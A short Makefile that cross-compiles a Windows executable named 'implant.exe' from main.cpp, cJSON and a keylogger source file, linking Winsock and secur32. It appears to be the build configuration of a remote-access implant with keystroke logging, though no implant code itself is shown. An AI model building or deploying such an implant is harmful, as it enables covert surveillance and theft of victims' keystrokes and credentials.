# Cross-compilation settings
TARGET_ARCH := i686
CROSS_PREFIX := $(TARGET_ARCH)-w64-mingw32
CC := $(CROSS_PREFIX)-g++

# Source files
SRC := main.cpp 
CJSON_SRC := ./includes/cJSON/cJSON.c
KEYLOGGER_SRC := ./includes/keylogger.c

# Output executable
OUT := implant.exe

# Compiler flags
CFLAGS := -Wall -O2 -ffunction-sections -fdata-sections -fmerge-all-constants
# Include paths
INCLUDES := -I./includes -I./includes/cJSON

# Linker flags
LDFLAGS := -lws2_32 -lsecur32 -static-libstdc++ -static-libgcc

all: $(OUT)

$(OUT): $(SRC) $(CJSON_SRC) $(KEYLOGGER_SRC)
	$(CC) $(CFLAGS) $(INCLUDES) -o $@ $^ $(LDFLAGS)

clean:
	rm -f $(OUT) *.o